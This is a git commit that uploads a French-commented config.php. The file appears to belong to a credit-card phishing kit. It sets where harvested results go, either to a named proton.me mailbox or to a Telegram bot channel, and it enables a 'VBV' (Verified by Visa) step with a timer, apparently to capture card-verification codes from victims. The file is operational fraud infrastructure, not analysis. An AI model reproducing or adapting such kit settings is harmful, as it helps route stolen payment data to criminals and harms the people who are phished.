dcc86b8ad73d44d4306a4c717ccc440b54366b27
falyupipa <feruipolica@proton.me>
2024-06-09 22:50:42 +0200

    Add files via upload

---
+++ config.php
@@ -0,0 +1,24 @@
+<?php
+
+#zerocution
+
+# Mail
+$mail_send = true;                                           # False pour ne pas recevoir par Mail
+$rezmail = "roselilapalacio@proton.me";
+
+#Telegram
+$tlg_send = false;                                       # False pour ne pas recevoir par Telegram
+$bot_token = "";
+
+$rez_chat = "-";                                 # Channel de réception des informations
+
+# VBV
+
+$vbv = true;
+$timeVBV = "15";
+
+# DEV
+
+$test_mode = false;
+
+?>
